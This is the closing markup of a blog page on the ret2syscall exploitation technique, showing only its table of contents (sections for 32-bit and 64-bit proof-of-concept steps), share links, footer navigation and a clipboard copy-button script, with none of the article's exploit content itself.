+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#32bits"><span class="toc-number">1.</span> <span class="toc-text">32bits</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#find-hole"><span class="toc-number">1.1.</span> <span class="toc-text">find hole</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poc1"><span class="toc-number">1.2.</span> <span class="toc-text">poc1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poc2"><span class="toc-number">1.3.</span> <span class="toc-text">poc2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poc3"><span class="toc-number">1.4.</span> <span class="toc-text">poc3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poc4"><span class="toc-number">1.5.</span> <span class="toc-text">poc4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#64bits"><span class="toc-number">2.</span> <span class="toc-text">64bits</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#what-we-need-do"><span class="toc-number">2.1.</span> <span class="toc-text">what we need do</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/10/13/ret2syscall/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/10/13/ret2syscall/&text=ret2syscall"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/10/13/ret2syscall/&title=ret2syscall"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/10/13/ret2syscall/&is_video=false&description=ret2syscall"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ret2syscall&body=Check out this article: http://example.com/2022/10/13/ret2syscall/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/10/13/ret2syscall/&title=ret2syscall"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/10/13/ret2syscall/&title=ret2syscall"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/10/13/ret2syscall/&title=ret2syscall"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/10/13/ret2syscall/&title=ret2syscall"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/10/13/ret2syscall/&name=ret2syscall&description=&lt;p&gt;This article will record some poc for ret2syscall.&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/10/13/ret2syscall/&t=ret2syscall"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    Bkfish
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
